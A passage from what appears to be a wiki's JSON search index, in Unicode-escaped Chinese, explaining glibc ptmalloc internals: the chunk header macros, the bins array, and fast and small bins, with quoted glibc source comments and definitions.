\u5b57\u6bb5\u5fc5\u7136\u662f\u65e0\u6548\u7684\uff0c\u6545\u800c\u8fd9\u4e2a\u5b57\u6bb5\u5c31\u53ef\u4ee5\u88ab\u5f53\u524d\u8fd9\u4e2a chunk \u4f7f\u7528\u3002\u8fd9\u5c31\u662f ptmalloc \u4e2d chunk \u95f4\u7684\u590d\u7528\u3002\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b \u9996\u5148\uff0c\u5229\u7528 REQUEST_OUT_OF_RANGE \u5224\u65ad\u662f\u5426\u53ef\u4ee5\u5206\u914d\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u5927\u5c0f\u7684 chunk\u3002 \u5176\u6b21\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u662f\u7528\u6765\u5b58\u50a8\u6570\u636e\u7684\uff0c\u5373 chunk header \u540e\u9762\u7684\u90e8\u5206\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8echunk \u95f4\u590d\u7528\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u3002\u56e0\u6b64\uff0c\u8fd9\u91cc\u53ea\u9700\u8981\u518d\u6dfb\u52a0 SIZE_SZ \u5927\u5c0f\u5373\u53ef\u4ee5\u5b8c\u5168\u5b58\u50a8\u5185\u5bb9\u3002 \u7531\u4e8e\u7cfb\u7edf\u4e2d\u6240\u5141\u8bb8\u7684\u7533\u8bf7\u7684 chunk \u6700\u5c0f\u662f MINSIZE\uff0c\u6240\u4ee5\u4e0e\u5176\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u4e0d\u6ee1\u8db3\u6700\u4f4e\u8981\u6c42\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u76f4\u63a5\u5206\u914dMINSIZE\u5b57\u8282\u3002 \u5982\u679c\u5927\u4e8e\u7684\u8bdd\uff0c\u56e0\u4e3a\u7cfb\u7edf\u4e2d\u7533\u8bf7\u7684 chunk \u9700\u8981 2 * SIZE_SZ \u5bf9\u9f50\uff0c\u6240\u4ee5\u8fd9\u91cc\u9700\u8981\u52a0\u4e0aMALLOC_ALIGN_MASK \u4ee5\u4fbf\u4e8e\u5bf9\u9f50\u3002 \u4e2a\u4eba\u8ba4\u4e3a\uff0c\u8fd9\u91cc\u5728 request2size \u7684\u5b8f\u7684\u7b2c\u4e00\u884c\u4e2d\u6ca1\u6709\u5fc5\u8981\u52a0\u4e0a MALLOC_ALIGN_MASK\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u901a\u8fc7\u8fd9\u6837\u7684\u8ba1\u7b97\u516c\u5f0f\u5f97\u5230\u7684 size \u6700\u7ec8\u4e00\u5b9a\u662f\u6ee1\u8db3\u7528\u6237\u9700\u8981\u7684\u3002 \u6807\u8bb0\u4f4d\u76f8\u5173 /* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */ #define PREV_INUSE 0x1 /* extract inuse bit of previous chunk */ #define prev_inuse(p) ((p)->mchunk_size & PREV_INUSE) /* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */ #define IS_MMAPPED 0x2 /* check for mmap()'ed chunk */ #define chunk_is_mmapped(p) ((p)->mchunk_size & IS_MMAPPED) /* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena. This is only set immediately before handing the chunk to the user, if necessary. */ #define NON_MAIN_ARENA 0x4 /* Check for chunk from main arena. */ #define chunk_main_arena(p) (((p)->mchunk_size & NON_MAIN_ARENA) == 0) /* Mark a chunk as not being on the main arena. */ #define set_non_main_arena(p) ((p)->mchunk_size |= NON_MAIN_ARENA) /* Bits to mask off when extracting size Note: IS_MMAPPED is intentionally not masked off from size field in macros for which mmapped chunks should never be seen. This should cause helpful core dumps to occur if it is tried by accident by people extending or adapting this malloc. */ #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) \u83b7\u53d6chunk size /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) \u83b7\u53d6\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684chunk /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) \u83b7\u53d6\u524d\u4e00\u4e2achunk\u7684\u4fe1\u606f /* Size of the chunk below P. Only valid if prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Set the size of the chunk below P. Only valid if prev_inuse (P). */ #define set_prev_size(p, sz) ((p)->mchunk_prev_size = (sz)) /* Ptr to previous physical malloc_chunk. Only valid if prev_inuse (P). */ #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) \u5f53\u524dchunk\u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c /* extract p's inuse bit */ #define inuse(p) \\ ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE) /* set/clear chunk as being inuse without otherwise disturbing */ #define set_inuse(p) \\ ((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size |= PREV_INUSE #define clear_inuse(p) \\ ((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size &= ~(PREV_INUSE) \u8bbe\u7f6echunk\u7684size\u5b57\u6bb5 /* Set size at head, without disturbing its use bit */ // SIZE_BITS = 7 #define set_head_size(p, s) \\ ((p)->mchunk_size = (((p)->mchunk_size & SIZE_BITS) | (s))) /* Set size/use field */ #define set_head(p, s) ((p)->mchunk_size = (s)) /* Set size at footer (only when chunk is not in use) */ #define set_foot(p, s) \\ (((mchunkptr)((char *) (p) + (s)))->mchunk_prev_size = (s)) \u83b7\u53d6\u6307\u5b9a\u504f\u79fb\u7684chunk /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) \u6307\u5b9a\u504f\u79fb\u5904chunk\u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c /* check/set/clear inuse bits in known places */ #define inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size & PREV_INUSE) #define set_inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size |= PREV_INUSE) #define clear_inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size &= ~(PREV_INUSE))","title":"chunk\u76f8\u5173\u5b8f"},{"location":"pwn/heap/heap_structure/#bin","text":"","title":"bin"},{"location":"pwn/heap/heap_structure/#_4","text":"\u6211\u4eec\u66fe\u7ecf\u8bf4\u8fc7\uff0c\u7528\u6237\u91ca\u653e\u6389\u7684 chunk \u4e0d\u4f1a\u9a6c\u4e0a\u5f52\u8fd8\u7ed9\u7cfb\u7edf\uff0cptmalloc \u4f1a\u7edf\u4e00\u7ba1\u7406 heap \u548c mmap \u6620\u5c04\u533a\u57df\u4e2d\u7684\u7a7a\u95f2\u7684chunk\u3002\u5f53\u7528\u6237\u518d\u4e00\u6b21\u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc \u5206\u914d\u5668\u4f1a\u8bd5\u56fe\u5728\u7a7a\u95f2\u7684chunk\u4e2d\u6311\u9009\u4e00\u5757\u5408\u9002\u7684\u7ed9\u7528\u6237\u3002\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9891\u7e41\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u964d\u4f4e\u5185\u5b58\u5206\u914d\u7684\u5f00\u9500\u3002 \u5728\u5177\u4f53\u7684\u5b9e\u73b0\u4e2d\uff0cptmalloc \u91c7\u7528\u5206\u7bb1\u5f0f\u65b9\u6cd5\u5bf9\u7a7a\u95f2\u7684 chunk \u8fdb\u884c\u7ba1\u7406\u3002\u9996\u5148\uff0c\u5b83\u4f1a\u6839\u636e\u7a7a\u95f2\u7684 chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u5c06 chunk \u521d\u6b65\u5206\u4e3a4\u7c7b\uff1afast bins\uff0csmall bins\uff0clarge bins\uff0cunsorted bin\u3002\u6bcf\u7c7b\u4e2d\u4ecd\u7136\u6709\u66f4\u7ec6\u7684\u5212\u5206\uff0c\u76f8\u4f3c\u5927\u5c0f\u7684 chunk \u4f1a\u7528\u53cc\u5411\u94fe\u8868\u94fe\u63a5\u8d77\u6765\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u6bcf\u7c7b bin \u7684\u5185\u90e8\u4ecd\u7136\u4f1a\u6709\u591a\u4e2a\u4e92\u4e0d\u76f8\u5173\u7684\u94fe\u8868\u6765\u4fdd\u5b58\u4e0d\u540c\u5927\u5c0f\u7684 chunk\u3002 \u5bf9\u4e8e small bins\uff0clarge bins\uff0cunsorted bin \u6765\u8bf4\uff0cPtmalloc \u5c06\u5b83\u4eec\u7ef4\u62a4\u5728\u540c\u4e00\u4e2a\u6570\u7ec4\u4e2d\u3002\u8fd9\u4e9bbin\u5bf9\u5e94\u7684\u6570\u636e\u7ed3\u6784\u5728 malloc_state \u4e2d\uff0c\u5982\u4e0b #define NBINS 128 /* Normal bins packed as described above */ mchunkptr bins [ NBINS * 2 - 2 ]; \u867d\u7136\u6bcf\u4e2a bin \u7684\u8868\u5934\u4f7f\u7528 mchunkptr \u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u8fd9\u53ea\u662f\u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\u5c06\u6bcf\u4e2a bin \u8f6c\u5316\u4e3a malloc_chunk \u6307\u9488\u3002\u6211\u4eec\u5728\u4f7f\u7528\u65f6\uff0c\u4f1a\u5c06\u8fd9\u4e2a\u6307\u9488\u5f53\u505a\u4e00\u4e2a chunk \u7684 fd \u6216 bk \u6307\u9488\u6765\u64cd\u4f5c\uff0c\u4ee5\u4fbf\u4e8e\u5c06\u5904\u4e8e\u7a7a\u95f2\u7684\u5806\u5757\u94fe\u63a5\u5728\u4e00\u8d77\u3002\u8fd9\u6837\u53ef\u4ee5\u8282\u7701\u7a7a\u95f4\uff0c\u5e76\u63d0\u9ad8\u53ef\u7528\u6027\u3002\u90a3\u5230\u5e95\u662f\u600e\u4e48\u8282\u7701\u7684\u5462\uff1f\u8fd9\u91cc\u6211\u4eec\u4ee532\u4f4d\u7cfb\u7edf\u4e3a\u4f8b \u542b\u4e49 bin1\u7684fd/bin2\u7684prev_size bin1\u7684bk/bin2\u7684size bin2\u7684fd/bin3\u7684prev_size bin2\u7684bk/bin3\u7684size bin\u4e0b\u6807 0 1 2 3 \u53ef\u4ee5\u770b\u51fa\u9664\u4e86\u7b2c\u4e00\u4e2abin\uff08unsorted bin\uff09\u5916\uff0c\u540e\u9762\u7684\u6bcf\u4e2abin\u4f1a\u5171\u4eab\u524d\u9762\u7684bin\u7684\u5b57\u6bb5\uff0c\u5c06\u5176\u89c6\u4e3amalloc chunk\u90e8\u5206\u7684prev_size\u548csize\u3002\u8fd9\u91cc\u4e5f\u8bf4\u660e\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c bin\u7684\u4e0b\u6807\u548c\u6211\u4eec\u6240\u8bf4\u7684\u7b2c\u51e0\u4e2abin\u5e76\u4e0d\u662f\u4e00\u81f4\u7684\u3002\u540c\u65f6\uff0cbin\u8868\u5934\u7684 chunk \u7684 prev_size \u4e0e size \u5b57\u6bb5\u4e0d\u80fd\u968f\u4fbf\u4fee\u6539\uff0c\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u662f\u88ab\u5176\u5b83bin\u6240\u5229\u7528\u7684\u3002 \u6570\u7ec4\u4e2d\u7684 bin \u4f9d\u6b21\u4ecb\u7ecd\u5982\u4e0b \u7b2c\u4e00\u4e2a\u4e3a unsorted bin\uff0c\u5b57\u5982\u5176\u9762\uff0c\u8fd9\u91cc\u9762\u7684 chunk \u6ca1\u6709\u8fdb\u884c\u6392\u5e8f\uff0c\u5b58\u50a8\u7684 chunk \u6bd4\u8f83\u6742\u3002 \u7d22\u5f15\u4ece 2 \u5230 63 \u7684 bin \u79f0\u4e3a small bin\uff0c\u540c\u4e00\u4e2a small bin \u94fe\u8868\u4e2d\u7684 chunk \u7684\u5927\u5c0f\u76f8\u540c\u3002\u4e24\u4e2a\u76f8\u90bb\u7d22\u5f15\u7684 small bin \u94fe\u8868\u4e2d\u7684 chunk \u5927\u5c0f\u76f8\u5dee\u7684\u5b57\u8282\u6570\u4e3a 2\u4e2a\u673a\u5668\u5b57\u957f \uff0c\u537332\u4f4d\u76f8\u5dee8\u5b57\u8282\uff0c64\u4f4d\u76f8\u5dee16\u5b57\u8282\u3002 small bins \u540e\u9762\u7684 bin \u88ab\u79f0\u4f5c large bins\u3002large bins \u4e2d\u7684\u6bcf\u4e00\u4e2a bin \u90fd\u5305\u542b\u4e00\u5b9a\u8303\u56f4\u5185\u7684 chunk\uff0c\u5176\u4e2d\u7684chunk \u6309 fd \u6307\u9488\u7684\u987a\u5e8f\u4ece\u5927\u5230\u5c0f\u6392\u5217\u3002\u76f8\u540c\u5927\u5c0f\u7684chunk\u540c\u6837\u6309\u7167\u6700\u8fd1\u4f7f\u7528\u987a\u5e8f\u6392\u5217\u3002 \u6b64\u5916\uff0c\u4e0a\u8ff0\u8fd9\u4e9bbin\u7684\u6392\u5e03\u90fd\u4f1a\u9075\u5faa\u4e00\u4e2a\u539f\u5219\uff1a \u4efb\u610f\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2chunk\u4e0d\u80fd\u5728\u4e00\u8d77 \u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684 chunk \u88ab\u91ca\u653e\u540e\u5c31\u7acb\u5373\u88ab\u653e\u5230 bin \u4e2d\u3002ptmalloc \u4e3a\u4e86\u63d0\u9ad8\u5206\u914d\u7684\u901f\u5ea6\uff0c\u4f1a\u628a\u4e00\u4e9b\u5c0f\u7684 chunk \u5148 \u653e\u5230 fast bins \u7684\u5bb9\u5668\u5185\u3002 \u800c\u4e14\uff0cfastbin \u5bb9\u5668\u4e2d\u7684 chunk \u7684\u4f7f\u7528\u6807\u8bb0\u603b\u662f\u88ab\u7f6e\u4f4d\u7684\uff0c\u6240\u4ee5\u4e0d\u6ee1\u8db3\u4e0a\u9762\u7684\u539f\u5219\u3002 bin \u901a\u7528\u7684\u5b8f\u5982\u4e0b typedef struct malloc_chunk * mbinptr ; /* addressing -- note that bin_at(0) does not exist */ #define bin_at(m, i) \\ (mbinptr)(((char *) &((m)->bins[ ((i) -1) * 2 ])) - \\ offsetof(struct malloc_chunk, fd)) /* analog of ++bin */ //\u83b7\u53d6\u4e0b\u4e00\u4e2abin\u7684\u5730\u5740 #define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) << 1))) /* Reminders about list directionality within bins */ // \u8fd9\u4e24\u4e2a\u5b8f\u53ef\u4ee5\u7528\u6765\u904d\u5386bin // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5934\u7684 chunk #define first(b) ((b)->fd) // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5c3e\u7684 chunk #define last(b) ((b)->bk)","title":"\u6982\u8ff0"},{"location":"pwn/heap/heap_structure/#fast-bin","text":"\u5927\u591a\u6570\u7a0b\u5e8f\u7ecf\u5e38\u4f1a\u7533\u8bf7\u4ee5\u53ca\u91ca\u653e\u4e00\u4e9b\u6bd4\u8f83\u5c0f\u7684\u5185\u5b58\u5757\u3002\u5982\u679c\u5c06\u4e00\u4e9b\u8f83\u5c0f\u7684 chunk \u91ca\u653e\u4e4b\u540e\u53d1\u73b0\u5b58\u5728\u4e0e\u4e4b\u76f8\u90bb\u7684\u7a7a\u95f2\u7684 chunk \u5e76\u5c06\u5b83\u4eec\u8fdb\u884c\u5408\u5e76\uff0c\u90a3\u4e48\u5f53\u4e0b\u4e00\u6b21\u518d\u6b21\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u5c31\u9700\u8981\u5bf9 chunk \u8fdb\u884c\u5206\u5272\uff0c\u8fd9\u6837\u5c31\u5927\u5927\u964d\u4f4e\u4e86\u5806\u7684\u5229\u7528\u6548\u7387\u3002 \u56e0\u4e3a\u6211\u4eec\u628a\u5927\u90e8\u5206\u65f6\u95f4\u82b1\u5728\u4e86\u5408\u5e76\u3001\u5206\u5272\u4ee5\u53ca\u4e2d\u95f4\u68c0\u67e5\u7684\u8fc7\u7a0b\u4e2d\u3002 \u56e0\u6b64\uff0cptmalloc \u4e2d\u4e13\u95e8\u8bbe\u8ba1\u4e86 fast bin\uff0c\u5bf9\u5e94\u7684\u53d8\u91cf\u5c31\u662f malloc state \u4e2d\u7684 fastbinsY /* Fastbins An array of lists holding recently freed small chunks. Fastbins are not doubly linked. It is faster to single-link them, and since chunks are never removed from the middles of these lists, double linking is not necessary. Also, unlike regular bins, they are not even processed in FIFO order (they use faster LIFO) since ordering doesn't much matter in the transient contexts in which fastbins are normally used. Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */ typedef struct malloc_chunk * mfastbinptr ; /* This is in malloc_state. /* Fastbins */ mfastbinptr fastbinsY [ NFASTBINS ]; */ \u4e3a\u4e86\u66f4\u52a0\u9ad8\u6548\u5730\u5229\u7528 fast bin\uff0cglibc \u91c7\u7528\u5355\u5411\u94fe\u8868\u5bf9\u5176\u4e2d\u7684\u6bcf\u4e2a bin \u8fdb\u884c\u7ec4\u7ec7\uff0c\u5e76\u4e14 \u6bcf\u4e2a bin \u91c7\u53d6 LIFO \u7b56\u7565 \uff0c\u6700\u8fd1\u91ca\u653e\u7684 chunk \u4f1a\u66f4\u65e9\u5730\u88ab\u5206\u914d\uff0c\u6240\u4ee5\u4f1a\u66f4\u52a0\u9002\u5408\u4e8e\u5c40\u90e8\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u7528\u6237\u9700\u8981\u7684 chunk \u7684\u5927\u5c0f\u5c0f\u4e8e fastbin \u7684\u6700\u5927\u5927\u5c0f\u65f6\uff0c ptmalloc \u4f1a\u9996\u5148\u5224\u65ad fastbin \u4e2d\u76f8\u5e94\u7684 bin \u4e2d\u662f\u5426\u6709\u5bf9\u5e94\u5927\u5c0f\u7684\u7a7a\u95f2\u5757\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u4f1a\u76f4\u63a5\u4ece\u8fd9\u4e2a bin \u4e2d\u83b7\u53d6 chunk\u3002\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0cptmalloc\u624d\u4f1a\u505a\u63a5\u4e0b\u6765\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff08 32\u4f4d\u7cfb\u7edf\u4e3a\u4f8b \uff09\uff0c fastbin \u4e2d\u9ed8\u8ba4\u652f\u6301\u6700\u5927\u7684 chunk \u7684\u6570\u636e\u7a7a\u95f4\u5927\u5c0f\u4e3a 64 \u5b57\u8282\u3002\u4f46\u662f\u5176\u53ef\u4ee5\u652f\u6301\u7684chunk\u7684\u6570\u636e\u7a7a\u95f4\u6700\u5927\u4e3a80\u5b57\u8282\u3002\u9664\u6b64\u4e4b\u5916\uff0c fastbin \u6700\u591a\u53ef\u4ee5\u652f\u6301\u7684 bin \u7684\u4e2a\u6570\u4e3a 10 \u4e2a\uff0c\u4ece\u6570\u636e\u7a7a\u95f4\u4e3a8\u5b57\u8282\u5f00\u59cb\u4e00\u76f4\u523080\u5b57\u8282\uff0c\u5b9a\u4e49\u5982\u4e0b #define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1) #ifndef DEFAULT_MXFAST #define DEFAULT_MXFAST (64 * SIZE_SZ / 4) #endif /* The maximum fastbin request size we support */ #define MAX_FAST_SIZE (80 * SIZE_SZ / 4) /* Since the lowest 2 bits in max_fast don't matter in size comparisons, they are used as flags. */ /* FASTCHUNKS_BIT held in max_fast indicates that there are probably some fastbin chunks. It is set true on entering a chunk into any fastbin, and cleared only in malloc_consolidate. The truth value is inverted so that have_fastchunks will be true upon startup (since statics are zero-filled), simplifying initialization checks. */ //\u5224\u65ad\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk\uff0c1\u8868\u793a\u6ca1\u6709 #define FASTCHUNKS_BIT (1U) #define have_fastchunks(M) (((M)->flags & FASTCHUNKS_BIT) == 0) #define clear_fastchunks(M) catomic_or(&(M)->flags, FASTCHUNKS_BIT) #define set_fastchunks(M) catomic_and(&(M)->flags, ~FASTCHUNKS_BIT) /* NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous regions. Otherwise, contiguity is exploited in merging together, when possible, results from consecutive MORECORE calls. The initial value comes from MORECORE_CONTIGUOUS, but is changed dynamically if mmap is ever used as an sbrk substitute. */ // MORECODE\u662f\u5426\u8fd4\u56de\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u3002 // \u4e3b\u5206\u914d\u533a\u4e2d\u7684MORECORE\u5176\u5b9e\u4e3asbr()\uff0c\u9ed8\u8ba4\u8fd4\u56de\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4 // \u975e\u4e3b\u5206\u914d\u533a\u4f7f\u7528mmap()\u5206\u914d\u5927\u5757\u865a\u62df\u5185\u5b58\uff0c\u7136\u540e\u8fdb\u884c\u5207\u5206\u6765\u6a21\u62df\u4e3b\u5206\u914d\u533a\u7684\u884c\u4e3a // \u800c\u9ed8\u8ba4\u60c5\u51b5\u4e0bmmap\u6620\u5c04\u533a\u57df\u662f\u4e0d\u4fdd\u8bc1\u865a\u62df\u5730\u5740\u7a7a\u95f4\u8fde\u7eed\u7684\uff0c\u6240\u4ee5\u975e\u4e3b\u5206\u914d\u533a\u9ed8\u8ba4\u5206\u914d\u975e\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002 #define NONCONTIGUOUS_BIT (2U) #define contiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) == 0) #define noncontiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) != 0) #define set_noncontiguous(M) ((M)->flags |= NONCONTIGUOUS_BIT) #define set_contiguous(M) ((M)->flags &= ~NONCONTIGUOUS_BIT) /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the arena. Such an arena is no longer used to allocate chunks. Chunks allocated in that arena before detecting corruption are not freed. */ #define ARENA_CORRUPTION_BIT (4U) #define arena_is_corrupt(A) (((A)->flags & ARENA_CORRUPTION_BIT)) #define set_arena_corrupt(A) ((A)->flags |= ARENA_CORRUPTION_BIT) /* Set value of max_fast. Use impossibly small value if 0. Precondition: there are no existing fastbin chunks. Setting the value clears fastchunk bit but preserves noncontiguous bit. */ #define set_max_fast(s) \\ global_max_fast = \\ (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) & ~MALLOC_ALIGN_MASK)) #define get_max_fast() global_max_fast ptmalloc \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f1a\u8c03\u7528 set_max_fast(s) \u5c06\u5168\u5c40\u53d8\u91cf global_max_fast \u8bbe\u7f6e\u4e3a DEFAULT_MXFAST\uff0c\u4e5f\u5c31\u662f\u8bbe\u7f6e fast bins \u4e2d chunk \u7684\u6700\u5927\u503c\u3002\u5f53 MAX_FAST_SIZE \u88ab\u8bbe\u7f6e\u4e3a 0 \u65f6\uff0c\u7cfb\u7edf\u5c31\u4e0d\u4f1a\u652f\u6301 fastbin \u3002 fastbin\u7684\u7d22\u5f15 #define fastbin(ar_ptr, idx) ((ar_ptr)->fastbinsY[ idx ]) /* offset 2 to use otherwise unindexable first 2 bins */ // chunk size=2*size_sz*(2+idx) // \u8fd9\u91cc\u8981\u51cf2\uff0c\u5426\u5219\u7684\u8bdd\uff0c\u524d\u4e24\u4e2abin\u6ca1\u6709\u529e\u6cd5\u7d22\u5f15\u5230\u3002 #define fastbin_index(sz) \\ ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) \u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0cfastbin \u8303\u56f4\u7684 chunk \u7684 inuse \u59cb\u7ec8\u88ab\u7f6e\u4e3a 1\u3002\u56e0\u6b64\u5b83\u4eec\u4e0d\u4f1a\u548c\u5176\u5b83\u88ab\u91ca\u653e\u7684chunk\u5408\u5e76\u3002 \u4f46\u662f\u5f53\u91ca\u653e\u7684 chunk \u4e0e\u8be5 chunk \u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5408\u5e76\u540e\u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD\u65f6\uff0c\u5185\u5b58\u788e\u7247\u53ef\u80fd\u6bd4\u8f83\u591a\u4e86\uff0c\u6211\u4eec\u5c31\u9700\u8981\u628a fast bins \u4e2d\u7684chunk\u90fd\u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u51cf\u5c11\u5185\u5b58\u788e\u7247\u5bf9\u7cfb\u7edf\u7684\u5f71\u54cd\u3002 /* FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free() that triggers automatic consolidation of possibly-surrounding fastbin chunks. This is a heuristic, so the exact value should not matter too much. It is defined at half the default trim threshold as a compromise heuristic to only attempt consolidation if it is likely to lead to trimming. However, it is not dynamically tunable, since consolidation reduces fragmentation surrounding large chunks even if trimming is not used. */ #define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) malloc_consolidate\u51fd\u6570\u53ef\u4ee5\u5c06fastbin\u4e2d\u6240\u6709\u7684chunk\u91ca\u653e\u5e76\u5408\u5e76\u5728\u4e00\u8d77\u3002\uff1f\uff1f\uff1f /* Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */","title":"fast bin"},{"location":"pwn/heap/heap_structure/#small-bin","text":"small bins \u4e2d\u6bcf\u4e2a chunk \u7684\u5927\u5c0f\u4e0e\u5176\u6240\u5728\u7684 bin \u7684 index \u7684\u5173\u7cfb\u4e3a\uff1achunk_size =2 * SIZE_SZ *index\uff0c\u5177\u4f53\u5982\u4e0b \u4e0b\u6807 SIZE_SZ=4\uff0832\u4f4d\uff09 SIZE_SZ=8\uff0864\u4f4d\uff09 2 16 32 3 24 48 4 32 64 5 40 80 x 2*4*x 2*8*x 63 504 1008 small bins \u4e2d\u4e00\u5171\u6709 62 \u4e2a\u94fe\u8868\uff0c\u6bcf\u4e2a\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u90fd\u4e00\u81f4\u3002\u6bd4\u5982\u5bf9\u4e8e 32 \u4f4d\u7cfb\u7edf\u6765\u8bf4\uff0c\u4e0b\u6807 2 \u5bf9\u5e94\u7684\u53cc\u5411\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u4e3a\u5747\u4e3a 16 \u5b57\u8282\u3002\u6bcf\u4e2a\u94fe\u8868\u90fd\u6709\u94fe\u8868\u5934\u7ed3\u70b9\uff0c\u8fd9\u6837\u53ef\u4ee5\u65b9\u4fbf\u5bf9\u4e8e\u94fe\u8868\u5185\u90e8\u7ed3\u70b9\u7684\u7ba1\u7406\u3002\u6b64\u5916\uff0c small bins \u4e2d\u6bcf\u4e2a bin \u5bf9\u5e94\u7684\u94fe\u8868\u91c7\u7528 FIFO \u7684\u89c4\u5219 \uff0c\u6240\u4ee5\u540c\u4e00\u4e2a\u94fe\u8868\u4e2d\u5148\u88ab\u91ca\u653e\u7684 chunk \u4f1a\u5148\u88ab\u5206\u914d\u51fa\u53bb\u3002 small bin\u76f8\u5173\u7684\u5b8f\u5982\u4e0b #define NSMALLBINS 64 #define SMALLBIN_WIDTH MALLOC_ALIGNMENT // \u662f\u5426\u9700\u8981\u5bf9small bin\u7684\u4e0b\u6807\u8fdb\u884c\u7ea0\u6b63 #define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT > 2 * SIZE_SZ) #define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) //\u5224\u65adchunk\u7684\u5927\u5c0f\u662f\u5426\u5728small bin\u8303\u56f4\u5185 #define in_smallbin_range(sz) \\ ((unsigned long) (sz) < (unsigned long) MIN_LARGE_SIZE) // \u6839\u636echunk\u7684\u5927\u5c0f\u5f97\u5230small bin\u5bf9\u5e94\u7684\u7d22\u5f15\u3002 #define smallbin_index(sz) \\ ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) >> 4) \\ : (((unsigned) (sz)) >> 3)) + \\ SMALLBIN_CORRECTION) \u6216\u8bb8\uff0c\u5927\u5bb6\u4f1a\u5f88\u7591\u60d1\uff0c\u90a3 fastbin \u4e0e small bin \u4e2d chunk \u7684\u5927\u5c0f\u4f1a\u6709\u5f88\u5927\u4e00\u90e8\u5206\u91cd\u5408\u554a\uff0c\u90a3 small bin \u4e2d\u5bf9\u5e94\u5927\u5c0f\u7684 bin \u662f\u4e0d\u662f\u5c31\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\u554a\uff1f \u5176\u5b9e\u4e0d\u7136\uff0cfast bin \u4e2d\u7684 chunk 